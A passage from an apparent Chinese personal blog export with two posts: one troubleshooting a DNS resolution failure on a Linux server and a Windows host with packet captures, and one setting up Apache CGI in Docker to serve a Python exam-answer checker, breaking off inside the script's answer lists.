    <url>/2019/12/23/%E5%AF%B9%E4%BA%8Eping%E7%9A%84%E9%80%9Aip%20ping%E5%9F%9F%E5%90%8D%E4%B8%8D%E9%80%9A%E9%97%AE%E9%A2%98%E7%9A%84%E8%A7%A3%E5%86%B3%E6%B5%81%E7%A8%8B%E4%BB%A5%E5%8F%8A%E6%80%9D%E8%80%83/</url>
    <content><![CDATA[<h1 id="对于主机DNS服务器出现问题的解决办法及思考"><a href="#对于主机DNS服务器出现问题的解决办法及思考" class="headerlink" title="对于主机DNS服务器出现问题的解决办法及思考"></a>对于主机DNS服务器出现问题的解决办法及思考</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​            大家好，我是青花，考研考完了，今天开始回来搞搞技术，另外觉得自己博客的主题风格不怎么样，而且插件也不完整，我会在最近这两天更改一下主题，另外加入评论搜索插件，不过在这个时候，我用来翻内网的梯子挂了，我很蒙蔽，连上了网页上不去，思考可能是DNS的问题，因为学校DNS三天两头的出问题，但是呢，我直接访问ip也不行，我这就很蒙蔽了，所以来解决一下这个问题，也为这个问题以后的排查解决思路给予一个方法。</p>
<h2 id="1-分析问题查找原因"><a href="#1-分析问题查找原因" class="headerlink" title="1 .分析问题查找原因"></a>1 .分析问题查找原因</h2><p>​                众所周知啊，这个肯定第一时间就想到的是DNS服务器的问题，</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20191224233336929.png" data-fancybox="group" data-caption="image-20191224233336929" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20191224233336929.png" alt="image-20191224233336929" title="image-20191224233336929"></a></p>
<p>没有反应（这里已经说明的很明白了，NAME OR SERVICE NOT KNOW）就是不知道域名被，接下来ping ip</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20191224233436032.png" data-fancybox="group" data-caption="image-20191224233436032" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20191224233436032.png" alt="image-20191224233436032" title="image-20191224233436032"></a></p>
<p>这里ping ip是ping的通的，如果我们跳过用DNS服务，直接用IP访问网页呢，这应该是可以的，正常情况下用IP可以直接跳过DNS的但是我却发现不行。这就叫我陷入了迷惑，于是我们开始排查问题所在。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20191224233602836.png" data-fancybox="group" data-caption="image-20191224233602836" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20191224233602836.png" alt="image-20191224233602836" title="image-20191224233602836"></a></p>
<p>话说这种问题，我真的是第一次见，所以我们来看看，感觉挺新鲜的，到底是哪里的问题，我们第一步还是排查是不是DNS服务器除了问题，接下来我们在考录我们的系统或者防火墙之类的。另外考虑防火墙可能BAN掉了某些东西，或者是系统配置出错，不过我三个多月没动我的服务器，我觉得可能性不大，所以，我先从DNS下手，我认为可能是学校的DNS服务器（大概率因为QQ上的去）出问题了。</p>
<p>我首先找出了学校内网的DNS先做修改，</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20191224233952601.png" data-fancybox="group" data-caption="image-20191224233952601" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20191224233952601.png" alt="image-20191224233952601" title="image-20191224233952601"></a></p>
<p>VIM编辑保存，重启DNS以及网络服务。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20191224234109414.png" data-fancybox="group" data-caption="image-20191224234109414" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20191224234109414.png" alt="image-20191224234109414" title="image-20191224234109414"></a></p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20191224234327091.png" data-fancybox="group" data-caption="image-20191224234327091" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20191224234327091.png" alt="image-20191224234327091" title="image-20191224234327091"></a></p>
<p>发现还是解析不出来，这就很奇怪了，按照问题一开始，明明是说DNS解析不出来，难道换了DNS也不行，DNS服务器也挂了？</p>
<p>继续排查，我Ping  dns服务器，发现一台服务器不通。（此处思考，应该一台不行换另外一台啊，难道系统呆在这里了？）</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20191228001253895.png" data-fancybox="group" data-caption="image-20191228001253895" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20191228001253895.png" alt="image-20191228001253895" title="image-20191228001253895"></a></p>
<p>继续进行，修改DNS地址，重启网络服务</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20191228001536881.png" data-fancybox="group" data-caption="image-20191228001536881" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20191228001536881.png" alt="image-20191228001536881" title="image-20191228001536881"></a></p>
<p>结果发现，DNS变回去了，我想可能是DHCP动态获取的时候给他委派了这个错误的DNS，这样修改不行啊，我们直接去网卡里面修改。</p>
<p>vim 打开</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim /etc/sysconfig/network-scripts/ifcfg-你的网卡名字</span><br></pre></td></tr></table></figure></div>

<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20191228002308073.png" data-fancybox="group" data-caption="image-20191228002308073" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20191228002308073.png" alt="image-20191228002308073" title="image-20191228002308073"></a></p>
<p>在这里改掉，保存，重启网络服务。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20191228002343506.png" data-fancybox="group" data-caption="image-20191228002343506" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20191228002343506.png" alt="image-20191228002343506" title="image-20191228002343506"></a></p>
<p>发现ping的通百度了，好像ok了啊，再到我的vpn客户端看一下。</p>
<p>然后发现服务器行了，但是我的主机却不行。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20191228003021472.png" data-fancybox="group" data-caption="image-20191228003021472" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20191228003021472.png" alt="image-20191228003021472" title="image-20191228003021472"></a></p>
<p>看样子主机这里DNS没有解决问题啊，我想可能是我pptp vpn的服务端配置没有变得缘故，重启pptpd服务器的服务</p>
<p>。发现重启了服务依旧如此，通过上面可以断定，就是DNS的问题，那么我们修改得到的DNS地址看看。</p>
<p>我打开了我的电脑的网络配置发现DNS是自动获取的，这个可能是学校内网的自动指定的DNS，但是自动指定的DNS第一个是错误的。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20191229225950935.png" data-fancybox="group" data-caption="image-20191229225950935" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20191229225950935.png" alt="image-20191229225950935" title="image-20191229225950935"></a></p>
<p>我们把它修改成正确的DNS，之后确定。<a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20191229230009425.png" data-fancybox="group" data-caption="image-20191229230009425" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20191229230009425.png" alt="image-20191229230009425" title="image-20191229230009425"></a></p>
<p>发现OK！<a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20191229230029206.png" data-fancybox="group" data-caption="image-20191229230029206" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20191229230029206.png" alt="image-20191229230029206" title="image-20191229230029206"></a></p>
<p>但是这里我还有一点不是特别明白，难道第一个DNS不能用，电脑不会切换到第二个吗？</p>
<p>所以我就上网上搜索了一下，不过没有什么结果，所以我决定用wireshark抓包分析一下流程，当然在linux上用tcpdump也可以，不过windows有cgi方便好多。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20191230112801951.png" data-fancybox="group" data-caption="image-20191230112801951" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20191230112801951.png" alt="image-20191230112801951" title="image-20191230112801951"></a></p>
<p>发现了一个问题，还得用tcpdump因为我忘了，我用的是pptpd  的梯子，所以这里协议都是ppp这种，我们切回服务器分析，问题出在哪里。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20191230113359423.png" data-fancybox="group" data-caption="image-20191230113359423" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20191230113359423.png" alt="image-20191230113359423" title="image-20191230113359423"></a></p>
<p>数据包抓取完毕，拖出来分析一下。（拖出来方法很多，比如自己开一个ftp也好自己用sftp也好，都无所谓这里不做赘述）</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20191230113818930.png" data-fancybox="group" data-caption="image-20191230113818930" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20191230113818930.png" alt="image-20191230113818930" title="image-20191230113818930"></a></p>
<p>但是这里可以看到他都向两台DNS服务器发起请求了，但是我很奇怪的是，为什么一台DNS服务器挂了就不行了呢？</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20191230114556022.png" data-fancybox="group" data-caption="image-20191230114556022" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20191230114556022.png" alt="image-20191230114556022" title="image-20191230114556022"></a></p>
<p>于是我把其他报文给弄出来，这里告诉我们DNS服务器不可达。（但是另外一个DNS服务器连这种响应报文都没有）</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20191230115151988.png" data-fancybox="group" data-caption="image-20191230115151988" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20191230115151988.png" alt="image-20191230115151988" title="image-20191230115151988"></a></p>
<p>但是我能够ping通啊。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20191230115542384.png" data-fancybox="group" data-caption="image-20191230115542384" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20191230115542384.png" alt="image-20191230115542384" title="image-20191230115542384"></a></p>
<p>但是我dig了一下，发现一个问题，正确的DNS是我指定的114.114.114.114返回的，我的10.0.9.1虽然能ping通，但是任然存在问题，所以考虑问题出在这里，思考既然是DNS服务器，他应该能够返回一个查询的A记录，但是这里却没有返回，所以我再次推断，应该是两台DNS服务器都挂了，所以我专门询问了网络中心的人，得知DNS服务器缺失存在问题。</p>
<p>上面Wireshark抓的包，一个是不可达，一个是都没有回复，当在一台不存在，还有一台不是dns服务器的时候，就会出现这个情况。然后我又抓了一些正常的DNS包。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20200101233115120.png" data-fancybox="group" data-caption="image-20200101233115120" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20200101233115120.png" alt="image-20200101233115120" title="image-20200101233115120"></a></p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20200101233333537.png" data-fancybox="group" data-caption="image-20200101233333537" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20200101233333537.png" alt="image-20200101233333537" title="image-20200101233333537"></a></p>
<p>正常的DNS解析流程。</p>
<p>所以得出结论是DNS服务器的问题。</p>
<h2 id="2-总结"><a href="#2-总结" class="headerlink" title="2.总结"></a>2.总结</h2><p>​        通过此次对于DNS服务器问题分析，给出了一个解决简单DNS出现问题的解决办法，分别对于linux以及windows的dns重新配置，除此之外，对于windows指定的两台DNS服务器的调用进行了简单分析，从而得出结论，当系统进行dns解析的时候，他会先向其中一台发出DNS查询，当该服务器不能回应的时候，他便向另外一台进行DNS查询，以便完成该查询。对于，输入域名解析不出来，但是QQ能够上，ping ip通都情况下，我们应该首要考虑是DNS服务器的问题。对于可能不是DNS服务器的问题我也考虑到了以下几点因素。</p>
<pre><code>1.系统更新，防火墙配置改变</code></pre><p>​     2.内网路由问题，不能正确到达。</p>
]]></content>
      <categories>
        <category>故障处理</category>
      </categories>
      <tags>
        <tag>胡乱折腾</tag>
        <tag>网络修复</tag>
      </tags>
  </entry>
  <entry>
    <title>Python3 cgi实现与web前端交互</title>
    <url>/2019/07/24/python%203%20CGI%20%E5%AE%9E%E7%8E%B0%E5%89%8D%E7%AB%AF%E4%BA%A4%E4%BA%92%EF%BC%88%E5%9F%BA%E4%BA%8EDocker%EF%BC%89/</url>
    <content><![CDATA[<h1 id="python-3-CGI-实现前端交互（基于Docker）"><a href="#python-3-CGI-实现前端交互（基于Docker）" class="headerlink" title="python 3 CGI 实现前端交互（基于Docker）"></a>python 3 CGI 实现前端交互（基于Docker）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    最近呢，因为考研复习比较紧张，就很少写博文了，不过学习都不能停哈，这个胡搞乱搞其实来自考研的一个需求，因为本人英语不是特别好，然后学习了一个方法就是，看文章写答案，但是不要对答案，这个不要对答案的意思呢，是找一个小伙伴帮你对，但是不告诉你错在哪里，然后自己慢慢摸索，直到全部循环到正确为止·····Balala，因为实现这个方法需要一个人给查吗，暑假我的小伙伴都回家了，自习室的我也不太好意思麻烦人家，最终我就忽然想到，我为什么不自己写一个程序帮我查呢？（PS：这个程序本来是自己用的，我把他扔到了我的服务器上，然后我用手机的SSH软件连接。不过呢，这两天跟一个在家里的小伙伴聊，小伙伴觉得不错，也想用一下，哎，为了造福人民大众，今天下午给自己放个假，happy一下，把他给扔到web页面，和后面的python交互，B/S架构牛批！）</p>
<h2 id="1-python-cgi-部署"><a href="#1-python-cgi-部署" class="headerlink" title="1 python cgi 部署"></a>1 python cgi 部署</h2><p>​    如果想把python扔到web页面，感觉有几种选择，第一用框架，直接上个django，flask。这个太重量级了，后来上网上查了查，发现CGI还不过，简单粗暴啊，我需求也不高，所以就打算用这个了，说干就干，开撸！</p>
<p>​    不过cgi的安装就有点恶心了，我的web容器是nginx的，nginx默认是不支持cgi的。（但是呢可以通过一些方法使得其支持，在网上查阅了一些资料，可以通过fastcgi构建） 不过这个服务器上本身就跑着我的一个博客，虽然说最近迁移到github上面了啊。</p>
<p>但是安装这个cgi支持，最简单粗暴的方法就是apache+cgi。哈哈，为了复习复习docker，我们那就在docker里面来玩一下然后映射到外面的端口开着不就行了嘛。</p>
<p>好啦，我们pull一个docker镜像 直接pull个linux系统的docker（别问我为什么不直接弄一个apache的下来，一会还得装python）</p>
<ul>
<li><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1563878839928.png" data-fancybox="group" data-caption="1563878839928" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1563878839928.png" alt="1563878839928" title="1563878839928"></a></li>
</ul>
<p>直接docker开一个容器。</p>
<p>然后  docker attach   id   进入容器</p>
<p>然后输入命令</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update &amp;&amp;  apt-get upgrade <span class="comment">#不知道这个景象放了多久了好像是ubuntu14版本的，先更新个源</span></span><br><span class="line">apt-get install -y apache2  <span class="comment">#安装apache</span></span><br><span class="line">/etc/init.d/apache2 start  <span class="comment">#启动服务</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1563879663700.png" data-fancybox="group" data-caption="1563879663700" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1563879663700.png" alt="1563879663700" title="1563879663700"></a></li>
</ul>
<p>由于我们映射到外部端口了，这里我们访问8080，成功！</p>
<p>接下来我们可以进行cgi的配置了。</p>
<p>由于我们的docker镜像没有装python，这里呢，我们需要装python</p>
<p>输入</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install -y python3</span><br></pre></td></tr></table></figure></div>

<p> 进入apache2的安装目录，看到</p>
<p>” mods-enabled “ 和 ” mods-available “ 这里面才发现一个问题，apache变了（可能是我搞乱了或者out了），不像从前找httpd.conf了</p>
<p>现在是这两个文件夹</p>
<p>mods-enabled  默认开启的功能</p>
<p>mods-available   默认不开启的功能</p>
<p>我们的CGI是默认不开启的，所以我们进入到下面的文件夹里面去开启一下</p>
<ul>
<li><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1563881228792.png" data-fancybox="group" data-caption="1563881228792" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1563881228792.png" alt="1563881228792" title="1563881228792"></a></li>
</ul>
<p>找到文件。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ln -s /etc/apache2/mods-available/cgid.conf /etc/apache2/mods-enabled/cgid.conf</span><br><span class="line">ln -s /etc/apache2/mods-available/cgid.load /etc/apache2/mods-enabled/cgid.load</span><br><span class="line">ln -s /etc/apache2/mods-available/cgi.load /etc/apache2/mods-enabled/cgi.load</span><br></pre></td></tr></table></figure></div>

<p>输入以上三条命令建立软连接，这个软连接就相当于我们windows的快捷方式。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/etc/init.d/apache2 restart</span><br></pre></td></tr></table></figure></div>

<p>然后重启apache服务</p>
<ul>
<li><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1563881500980.png" data-fancybox="group" data-caption="1563881500980" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1563881500980.png" alt="1563881500980" title="1563881500980"></a></li>
</ul>
<p>发现出现了这个文件。</p>
<p>然后我们vim 打开这个文件，配置一下cgi的目录。</p>
<ul>
<li><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1563881715715.png" data-fancybox="group" data-caption="1563881715715" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1563881715715.png" alt="1563881715715" title="1563881715715"></a></li>
</ul>
<p>我们修改</p>
<p>Scruptalias  最后面的内容/usr那里，我这里是修改好的了，这个其实就是指定一个你cgi脚本的目录，当你在浏览器访问/cgi-bin/系统就会自动找到这个目录里面去。</p>
<p>然后别忘了重启Apache服务</p>
<ul>
<li><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1563881836341.png" data-fancybox="group" data-caption="1563881836341" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1563881836341.png" alt="1563881836341" title="1563881836341"></a></li>
</ul>
<p>我们到指定目录下建立一个cgi的文件夹</p>
<p>然后进入创建一个.py文件编辑</p>
<ul>
<li><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1563882514555.png" data-fancybox="group" data-caption="1563882514555" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1563882514555.png" alt="1563882514555" title="1563882514555"></a></li>
</ul>
<p>比如说我这里，我们这里就成功的编辑了这个文件了，然后通过web访问，发现web页面已经回显结果了。</p>
<p>这里特别要注意一定要加  第一行</p>
<p>告诉用什么解释器</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/env python3.6</span></span><br></pre></td></tr></table></figure></div>

<p>否则http就会报500,另外，你应该给这个程序755权限。</p>
<h2 id="2-创建前端页面实现与后端交互"><a href="#2-创建前端页面实现与后端交互" class="headerlink" title="2 创建前端页面实现与后端交互"></a>2 创建前端页面实现与后端交互</h2><p>​    由于我的页面只做于考研查阅资料用什么CSS+JS美工啥的我也没做，就凑活用用吧先。</p>
<p>其实也很简单，首先呢我先写个前端页面，很简单的。然后放到apache指定的网站根目录下。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">html</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>考研英语阅读检查@青花<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">body&#123;</span><br><span class="line">	background-image: url(https://ss2.bdstatic.com/70cFvnSh_Q1YnxGkpoWK1HF6hhy/it/u=358446648,1506816524&amp;fm=26&amp;gp=0.jpg);</span><br><span class="line">	background-size: 100%;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>考研英语阅读错误个数检查<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>Tips:请您按照提示输入，先输入年份比如说您想查阅1998年的就输入y98,2000的就输入y00,2010的就输入y10。<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>然后再根据您的作答输入答案（如果只检查单题在其他题目作答地方不输入即可），比如说答第一题，就在第一<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>题的地方输入&amp;nbsp&amp;nbspa,a,a,a&amp;nbsp&amp;nbsp中间用逗号隔开，点击提交系统会将结果返还给您。后台程序写的潦草，可能会有一些输<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>页面不能正常回显，存在一些bug需要解决，我会在后面有时间来修复完善，请您谅解。<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"/cgi-bin/get.py"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">查阅年份:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"data_1"</span> &gt;</span> </span><br><span class="line">&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp </span><br><span class="line">&amp;nbsp第一题答案:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"data_2"</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">第二题答案:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"data_3"</span>&gt;</span></span><br><span class="line">&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp </span><br><span class="line">第三题答案:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"data_4"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">第四题答案: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"data_5"</span>&gt;</span></span><br><span class="line">&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp </span><br><span class="line">第五题答案:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"data_6"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>​    效果图</p>
<ul>
<li>​    <a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1563941842023.png" data-fancybox="group" data-caption="1563941842023" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1563941842023.png" alt="1563941842023" title="1563941842023"></a></li>
</ul>
<p>然后我们测试输入即可。</p>
<p>其实只要学过其他的什么php，asp,jsp应该都明白就是html表单提交给我们程序处理吗。然后我们程序处理返回一个结果。</p>
<p>然后呢我们利用cgi写一个后台处理的程序。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3.6</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cgi</span><br><span class="line"><span class="keyword">import</span> cgitb</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">  <span class="comment">##### </span></span><br><span class="line"></span><br><span class="line">    y98=[[<span class="string">"c"</span>,<span class="string">"d"</span>,<span class="string">"d"</span>,<span class="string">"c"</span>],[<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"b"</span>,<span class="string">"a"</span>],[<span class="string">"c"</span>,<span class="string">"d"</span>,<span class="string">"a"</span>,<span class="string">"a"</span>],[<span class="string">"b"</span>,<span class="string">"c"</span>,<span class="string">"d"</span>,<span class="string">"c"</span>],[<span class="string">"b"</span>,<span class="string">"b"</span>,<span class="string">"d"</span>,<span class="string">"c"</span>]]</span><br><span class="line">    y99=[[<span class="string">"b"</span>,<span class="string">"c"</span>,<span class="string">"a"</span>,<span class="string">"d"</span>],[<span class="string">"a"</span>,<span class="string">"c"</span>,<span class="string">"d"</span>,<span class="string">"b"</span>],[<span class="string">"b"</span>,<span class="string">"d"</span>,<span class="string">"c"</span>,<span class="string">"a"</span>],[<span class="string">"b"</span>,<span class="string">"c"</span>,<span class="string">"d"</span>,<span class="string">"a"</span>],[<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"d"</span>,<span class="string">"a"</span>]]</span><br><span class="line">    y00=[[<span class="string">"c"</span>,<span class="string">"d"</span>,<span class="string">"b"</span>,<span class="string">"a"</span>],[<span class="string">"c"</span>,<span class="string">"b"</span>,<span class="string">"a"</span>,<span class="string">"d"</span>],[<span class="string">"b"</span>,<span class="string">"a"</span>,<span class="string">"c"</span>,<span class="string">"d"</span>],[<span class="string">"b"</span>,<span class="string">"d"</span>,<span class="string">"c"</span>,<span class="string">"a"</span>],[<span class="string">"a"</span>,<span class="string">"c"</span>,<span class="string">"d"</span>,<span class="string">"b"</span>]]</span><br><span class="line">    y01=[[<span class="string">"d"</span>,<span class="string">"b"</span>,<span class="string">"a"</span>,<span class="string">"c"</span>],[<span class="string">"c"</span>,<span 